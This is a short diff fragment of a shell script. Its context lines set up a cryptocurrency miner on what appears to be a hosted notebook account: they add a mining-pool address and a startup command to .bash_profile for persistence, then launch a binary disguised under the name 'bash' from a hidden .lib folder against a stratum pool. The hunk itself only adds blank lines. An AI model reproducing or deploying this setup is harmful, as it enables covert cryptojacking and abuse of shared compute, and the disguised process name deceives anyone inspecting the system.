@@ -24,3 +24,6 @@ echo 'POOLNH="152.53.136.133:443"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
 echo "./.lib/bash -P stratum1+tcp://$WALLETNH.$WORKER@$POOLNH" > /home/studio-lab-user/.lib/gas.sh
 chmod +x bash && cd ~/ && source .bashrc
+
+
+
